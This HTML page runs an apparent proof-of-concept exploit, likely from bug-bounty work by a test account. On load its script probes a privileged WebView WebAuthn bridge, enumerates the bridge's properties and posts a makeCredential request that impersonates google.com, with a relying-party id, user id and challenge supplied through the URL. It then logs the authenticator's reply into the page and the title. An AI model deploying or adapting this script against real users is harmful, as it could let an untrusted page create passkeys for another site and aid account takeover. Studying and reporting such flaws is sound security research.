<!doctype html>
<html><head><meta charset="utf-8"><title>MM D1A MAKE-CRED</title></head>
<body style="background:#030;color:#fff;font-family:sans-serif;font-size:15px">
<h1 id="st">D1A MAKECREDENTIAL google.com</h1>
<pre id="log">BOOT</pre>
<script>
function q(k){ var s=location.search + "&" + location.hash.slice(1);
  var m=s.match(new RegExp("[&#?]*"+k+"=([^&]*)")); return m ? decodeURIComponent(m[1]) : null; }
var CH = q("challenge") || "AAECAwQFBgcICQoLDA0ODxAREhM=";
var RP = q("rp") || "google.com";
// GAIA for hackeronetest.bytestunt@gmail.com (b64 of numeric id)
var UID = q("user") || "MTE2NjcxODQxMTMxMTgzODc0ODYz";
window.__reply = "";
function ev(m){ try{ document.getElementById('log').textContent += "\n" + m;
  document.title = ("EV:" + m).slice(0,300); }catch(e){} }
ev("loaded " + location.href);
if (!window.__webauthn_interface__) { ev("IFACE_ABSENT"); }
else {
  var keys = "?";
  try { keys = Object.getOwnPropertyNames(window.__webauthn_interface__).join(","); } catch(e){ keys="ERR:"+e; }
  ev("IFACE_PRESENT keys=" + keys);
  window.__webauthn_interface__.onmessage = function(m){
    var s = (typeof m === 'string') ? m : JSON.stringify(m);
    window.__reply = s;
    ev("REPLY len=" + s.length);
    ev("REPLY:" + s.slice(0, 8000));
  };
  // makeCredential-shaped message (assignment payload)
  var msg = JSON.stringify({ publicKey: {
      rp: { name: "google.com", id: RP },
      user: { id: UID, name: "hackeronetest", displayName: "Hackeronetest" },
      challenge: CH,
      pubKeyCredParams: [ {type:"public-key",alg:-7}, {type:"public-key",alg:-257} ],
      timeout: 120000,
      authenticatorSelection: { authenticatorAttachment:"platform", userVerification:"required" },
      attestation: "none"
  } });
  setTimeout(function(){
    try { window.__webauthn_interface__.postMessage(msg);
      ev("POSTED_OK MAKECRED ch=" + CH.slice(0,40) + " rp=" + RP); }
    catch(e){ ev("POST_ERR:" + e); }
  }, 1500);
}
</script></body></html>
